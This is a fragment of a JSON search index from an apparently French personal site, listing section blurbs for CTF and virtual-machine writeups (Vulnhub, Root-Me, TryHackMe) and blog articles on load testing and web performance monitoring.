:\nStart Tor Browser with the proxy Add the arguments to commandline --tor start the fuzzing "},{"id":8,"href":"/docs/writeups/vm/","title":"Virtual Machines","section":"Writeups","content":" Virtual Machines # Cette section comprend tous les writeups que j\u0026rsquo;ai pu écrire pour des challenges provenant de différentes plateformes :\nVulnhub Root-Me TryHackMe "},{"id":9,"href":"/docs/writeups/","title":"Writeups","section":"Docs","content":" Writeups # Dans cette section, vous trouverez quelques write-ups à propos des CTF auxquels j\u0026rsquo;ai pu participer.\nLes Writeups sont des comptes-rendu, plus ou moins détaillé, des CTFs et divers challenge de sécurité. Ceux-ci permettent de détailler un cheminement, plus ou moins intellectuel, et plus ou moins subtile !\n"},{"id":10,"href":"/docs/divers/blogs/","title":"Blogs","section":"Divers","content":" Articles de blogs # J\u0026rsquo;ai eu la chance de pouvoir écrire plusieurs articles de blogs sur des sujets divers et variés. En voici la liste :\nModernisation des applications : Evolution \u0026amp; Enjeux Test de charge : Quel outil open source pour générer une forte charge ? Synthetic Monitoring avec Sitespeed.io et Grafana Tester les performances d’un client web "}]